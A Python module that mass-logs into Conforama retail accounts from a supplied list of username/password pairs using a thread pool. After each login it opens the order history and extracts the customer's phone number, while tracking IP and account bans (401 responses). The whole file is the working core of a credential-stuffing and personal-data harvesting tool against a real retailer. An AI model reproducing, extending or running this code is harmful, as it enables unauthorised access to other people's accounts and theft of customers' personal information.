"""
Phone Extractor Module
Handles the phone number extraction process for accounts
"""

import threading
from typing import Optional, Callable, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import platform

from conforama_session import ConforamaSession
import config

# Detect Windows for CPU optimizations
IS_WINDOWS = platform.system() == "Windows"


class PhoneResult:
    def __init__(self, username: str, password: str = "", phone: Optional[str] = None, 
                 success: bool = False, error: Optional[str] = None, banned: bool = False):
        self.username = username
        self.password = password
        self.phone = phone
        self.success = success
        self.error = error
        self.banned = banned


class PhoneExtractor:
    def __init__(self, max_workers: int = 3, callback: Optional[Callable] = None):
        self.max_workers = max_workers
        self.callback = callback
        self.stop_event = threading.Event()
    
    def process_single_account(self, username: str, password: str) -> PhoneResult:
        if self.stop_event.is_set():
            return PhoneResult(username, password, error="Process stopped")
        
        try:
            with ConforamaSession() as session:
                login_result = session.get_login_page()
                if login_result == "banned":
                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
                if not login_result:
                    return PhoneResult(username, password, error="Failed to load login page")
                
                login_result = session.perform_login(username, password)
                if login_result == "banned":
                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
                if not login_result:
                    return PhoneResult(username, password, error="Login failed")
                
                order_result = session.get_order_history()
                if order_result == "banned":
                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
                if not order_result:
                    return PhoneResult(username, password, error="Failed to access order history")
                
                phone = session.get_customer_address()
                
                if phone == "banned":
                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
                elif phone:
                    result = PhoneResult(username, password, phone=phone, success=True)
                    return result
                else:
                    return PhoneResult(username, password, error="No phone number found")
        
        except Exception as e:
            return PhoneResult(username, password, error=f"Exception: {str(e)}")
    
    def process_accounts_threaded(self, credentials: List[Tuple[str, str]]) -> None:
        completed_count = 0
        total_count = len(credentials)
        
        # Announce start of extraction
        if self.callback:
            self.callback(PhoneResult("", "", "", False, "Starting extraction..."), 0, total_count)
        
        # Start processing immediately with a continuous approach
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_account = {}
            submitted_count = 0
            
            # Submit initial batch immediately
            initial_batch = min(self.max_workers * 3, len(credentials))
            
            # Announce task submission
            if self.callback:
                self.callback(PhoneResult("", "", "", False, f"Submitting first {initial_batch} tasks..."), 0, total_count)
            
            for i in range(initial_batch):
                if self.stop_event.is_set():
                    break
                username, password = credentials[i]
                future = executor.submit(self.process_single_account, username, password)
                future_to_account[future] = (username, password, i)
                submitted_count += 1
            
            # Announce that tasks are running
            if self.callback:
                self.callback(PhoneResult("", "", "", False, f"Tasks submitted - awaiting first responses..."), 0, total_count)
            
            # Process results as they come and submit more tasks
            remaining_credentials = credentials[initial_batch:]
            remaining_index = initial_batch
            
            while future_to_account or remaining_credentials:
                if self.stop_event.is_set():
                    break
                
                # Submit more tasks if we have capacity and remaining credentials
                while len(future_to_account) < self.max_workers * 5 and remaining_credentials:
                    if self.stop_event.is_set():
                        break
                    
                    username, password = remaining_credentials.pop(0)
                    future = executor.submit(self.process_single_account, username, password)
                    future_to_account[future] = (username, password, remaining_index)
                    submitted_count += 1
                    remaining_index += 1
                
                # Check for completed futures (non-blocking)
                completed_futures = []
                for future in list(future_to_account.keys()):
                    if future.done():
                        completed_futures.append(future)
                
                # Process completed futures immediately
                for future in completed_futures:
                    username, password, _ = future_to_account.pop(future)
                    completed_count += 1
                    
                    try:
                        result = future.result()
                        if self.callback:
                            self.callback(result, completed_count, total_count)
                    except Exception as e:
                        result = PhoneResult(username, password, error=f"Future exception: {str(e)}")
                        if self.callback:
                            self.callback(result, completed_count, total_count)
                
                # Small delay to prevent busy waiting (platform-specific optimization)
                if not completed_futures:
                    # Windows needs longer delays to prevent high CPU usage
                    sleep_time = 0.1 if IS_WINDOWS else 0.05
                    time.sleep(sleep_time)
    
    def stop(self):
        self.stop_event.set()
